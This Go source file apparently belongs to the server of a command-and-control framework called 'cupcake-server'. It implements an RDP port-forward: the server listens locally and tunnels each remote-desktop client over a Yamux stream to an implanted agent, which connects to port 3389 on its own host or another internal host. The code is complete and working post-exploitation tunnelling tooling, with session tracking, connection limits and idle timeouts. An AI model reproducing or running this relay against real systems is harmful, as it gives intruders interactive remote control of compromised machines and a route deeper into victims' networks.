package services

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/utils"
)

// Desktop RDP connection protections.
const (
	// desktopRDPIdleTimeout closes a relay half after this long with no I/O.
	desktopRDPIdleTimeout = 120 * time.Second
	// desktopMaxConnsPerAgent caps concurrent mstsc→agent pipes per agent.
	desktopMaxConnsPerAgent = 8
	// desktopDefaultListenHost is loopback unless CUPCAKE_DESKTOP_LISTEN_HOST overrides.
	desktopDefaultListenHost = "127.0.0.1"
)

// DesktopRdpSession is an RDP port-forward: C2 listens, each accept dials agent → target:3389
// via Yamux DESKTOP (0x0D). Agent requires L2 module "desktop" Loaded (Stage0 thin bridge).
type DesktopRdpSession struct {
	AgentID    string
	ListenHost string // e.g. "127.0.0.1"
	ListenPort int    // actual bound port
	TargetHost string // agent-side host (default 127.0.0.1)
	TargetPort int    // agent-side port (default 3389)
	Bind       string // full bind address used for Listen
	OpenedAt   time.Time
	listener   net.Listener
}

var (
	desktopMu          sync.Mutex
	desktopByID        = map[string]*DesktopRdpSession{}
	desktopActiveConns = map[string]int{}
)

// DesktopBusyError means another RDP forward already holds this agent.
var DesktopBusyError = fmt.Errorf("desktop busy")

// DesktopConnLimitError means too many concurrent RDP client connections for this agent.
var DesktopConnLimitError = fmt.Errorf("desktop connection limit exceeded")

// HasDesktopSession reports whether agent already has an RDP forward open.
func HasDesktopSession(agentID string) bool {
	desktopMu.Lock()
	defer desktopMu.Unlock()
	_, ok := desktopByID[agentID]
	return ok
}

// GetDesktopSession returns a copy of the RDP session metadata (nil if none).
func GetDesktopSession(agentID string) *DesktopRdpSession {
	desktopMu.Lock()
	defer desktopMu.Unlock()
	s, ok := desktopByID[agentID]
	if !ok {
		return nil
	}
	cp := *s
	cp.listener = nil
	return &cp
}

// DesktopActiveConnCount returns current live client pipes for an agent (tests/diagnostics).
func DesktopActiveConnCount(agentID string) int {
	desktopMu.Lock()
	defer desktopMu.Unlock()
	return desktopActiveConns[agentID]
}

// resolveDesktopListenHost returns bind host: env CUPCAKE_DESKTOP_LISTEN_HOST or loopback.
func resolveDesktopListenHost() string {
	h := strings.TrimSpace(os.Getenv("CUPCAKE_DESKTOP_LISTEN_HOST"))
	if h == "" {
		return desktopDefaultListenHost
	}
	return h
}

// StartDesktopRDP starts a TCP listener and forwards accepted connections to
// agent-side TargetHost:TargetPort (default 127.0.0.1:3389) via Yamux DESKTOP.
// listenPort 0 = OS-assigned free port. Agent must have L2 module desktop Loaded.
// Default bind is 127.0.0.1; set CUPCAKE_DESKTOP_LISTEN_HOST for external interfaces.
func StartDesktopRDP(agentID, targetHost string, targetPort, listenPort int) (*DesktopRdpSession, error) {
	if targetHost == "" {
		targetHost = "127.0.0.1"
	}
	if targetPort <= 0 {
		targetPort = 3389
	}
	if targetPort > 65535 {
		return nil, fmt.Errorf("invalid target port")
	}
	if listenPort < 0 || listenPort > 65535 {
		return nil, fmt.Errorf("invalid listen port")
	}

	// Require live Yamux session
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)
	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
		return nil, fmt.Errorf("no yamux session (need TCP agent)")
	}

	desktopMu.Lock()
	if _, exists := desktopByID[agentID]; exists {
		desktopMu.Unlock()
		return nil, DesktopBusyError
	}
	// Hold reservation while we bind so concurrent Start cannot race
	desktopByID[agentID] = &DesktopRdpSession{
		AgentID:    agentID,
		TargetHost: targetHost,
		TargetPort: targetPort,
		OpenedAt:   time.Now(),
	}
	desktopMu.Unlock()

	listenHost := resolveDesktopListenHost()
	bind := net.JoinHostPort(listenHost, strconv.Itoa(listenPort))
	ln, err := net.Listen("tcp", bind)
	if err != nil {
		desktopMu.Lock()
		delete(desktopByID, agentID)
		desktopMu.Unlock()
		return nil, fmt.Errorf("listen %s: %w", bind, err)
	}

	// Resolve actual port when listenPort was 0
	actualPort := listenPort
	if ta, ok := ln.Addr().(*net.TCPAddr); ok {
		actualPort = ta.Port
	}

	sess := &DesktopRdpSession{
		AgentID:    agentID,
		ListenHost: listenHost,
		ListenPort: actualPort,
		TargetHost: targetHost,
		TargetPort: targetPort,
		Bind:       ln.Addr().String(),
		OpenedAt:   time.Now(),
		listener:   ln,
	}

	desktopMu.Lock()
	desktopByID[agentID] = sess
	desktopMu.Unlock()

	go acceptDesktopRDP(agentID, ln, targetHost, targetPort)

	log.Printf("[desktop-rdp] started agent=%s listen=%s → agent %s:%d",
		agentID, ln.Addr().String(), targetHost, targetPort)
	return sess, nil
}

// StopDesktopRDP closes the listener and removes the session. Idempotent.
func StopDesktopRDP(agentID string) {
	desktopMu.Lock()
	s, ok := desktopByID[agentID]
	if ok {
		delete(desktopByID, agentID)
	}
	desktopMu.Unlock()
	if !ok {
		return
	}
	if s.listener != nil {
		_ = s.listener.Close()
	}
	log.Printf("[desktop-rdp] stopped agent=%s", agentID)
}

// ReleaseDesktop is an alias kept for call sites / tests.
func ReleaseDesktop(agentID string) {
	StopDesktopRDP(agentID)
}

func acceptDesktopRDP(agentID string, ln net.Listener, targetHost string, targetPort int) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			// Listener closed or fatal
			log.Printf("[desktop-rdp] accept end agent=%s: %v", agentID, err)
			return
		}
		go handleDesktopRDPConn(agentID, conn, targetHost, targetPort)
	}
}

// idleDeadlineConn resets read/write deadlines on every I/O so idle pipes die.
type idleDeadlineConn struct {
	net.Conn
	idle time.Duration
}

func (c *idleDeadlineConn) Read(b []byte) (int, error) {
	_ = c.Conn.SetReadDeadline(time.Now().Add(c.idle))
	return c.Conn.Read(b)
}

func (c *idleDeadlineConn) Write(b []byte) (int, error) {
	_ = c.Conn.SetWriteDeadline(time.Now().Add(c.idle))
	return c.Conn.Write(b)
}

func handleDesktopRDPConn(agentID string, clientConn net.Conn, targetHost string, targetPort int) {
	defer clientConn.Close()
	remote := clientConn.RemoteAddr().String()
	log.Printf("[desktop-rdp] client %s → agent %s %s:%d", remote, agentID, targetHost, targetPort)

	// Still registered?
	if !HasDesktopSession(agentID) {
		return
	}

	// Per-agent concurrent connection cap
	desktopMu.Lock()
	if desktopActiveConns[agentID] >= desktopMaxConnsPerAgent {
		desktopMu.Unlock()
		log.Printf("[desktop-rdp] conn limit agent=%s remote=%s", agentID, remote)
		return
	}
	desktopActiveConns[agentID]++
	desktopMu.Unlock()
	defer func() {
		desktopMu.Lock()
		desktopActiveConns[agentID]--
		if desktopActiveConns[agentID] <= 0 {
			delete(desktopActiveConns, agentID)
		}
		desktopMu.Unlock()
	}()

	stream, err := DialAgentDesktop(agentID, targetHost, uint16(targetPort))
	if err != nil {
		log.Printf("[desktop-rdp] dial agent failed %s: %v", agentID, err)
		return
	}
	defer stream.Close()

	// Idle timeout on both sides of the pipe
	cIdle := &idleDeadlineConn{Conn: clientConn, idle: desktopRDPIdleTimeout}
	sIdle := &idleDeadlineConn{Conn: stream, idle: desktopRDPIdleTimeout}

	// Bidirectional pipe: mstsc ↔ yamux DESKTOP ↔ agent bridge ↔ RDP:3389
	done := make(chan struct{}, 2)
	go func() {
		_, _ = io.Copy(sIdle, cIdle)
		done <- struct{}{}
	}()
	go func() {
		_, _ = io.Copy(cIdle, sIdle)
		done <- struct{}{}
	}()
	<-done
	_ = stream.Close()
	_ = clientConn.Close()
	<-done
	log.Printf("[desktop-rdp] pipe closed %s agent=%s", remote, agentID)
}

// DialAgentDesktop opens a Yamux DESKTOP (0x0D) stream and asks the agent to
// connect to host:port. Agent Stage0 bridge requires L2 module "desktop" Loaded.
// Wire: type byte + [host_len u8][host][port u16 BE] + 1-byte ACK (0x01/0x00).
func DialAgentDesktop(agentID, host string, port uint16) (net.Conn, error) {
	if host == "" {
		return nil, fmt.Errorf("empty host")
	}
	if len(host) > 255 {
		return nil, fmt.Errorf("host too long")
	}

	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)
	session := client.YamuxSession
	if session == nil || session.IsClosed() {
		return nil, fmt.Errorf("no yamux session")
	}

	stream, err := session.Open()
	if err != nil {
		return nil, fmt.Errorf("yamux open: %w", err)
	}

	// Type byte: DESKTOP data plane (agent desktop_bridge — module-gated)
	if _, err := stream.Write([]byte{utils.YamuxStreamDesktop}); err != nil {
		_ = stream.Close()
		return nil, fmt.Errorf("write stream type: %w", err)
	}

	// Target: [host_len u8][host][port u16 BE] (same framing as SOCKS target info)
	sendTargetInfo(stream, host, strconv.Itoa(int(port)))

	_ = stream.SetReadDeadline(time.Now().Add(30 * time.Second))
	ack := make([]byte, 1)
	if _, err := io.ReadFull(stream, ack); err != nil {
		_ = stream.Close()
		return nil, fmt.Errorf("agent dial ack: %w", err)
	}
	_ = stream.SetReadDeadline(time.Time{})
	if ack[0] != 0x01 {
		_ = stream.Close()
		return nil, fmt.Errorf(
			"agent RDP dial failed to %s:%d (load L2 module 'desktop' first, or RDP not listening / firewalled)",
			host, port,
		)
	}
	return stream, nil
}
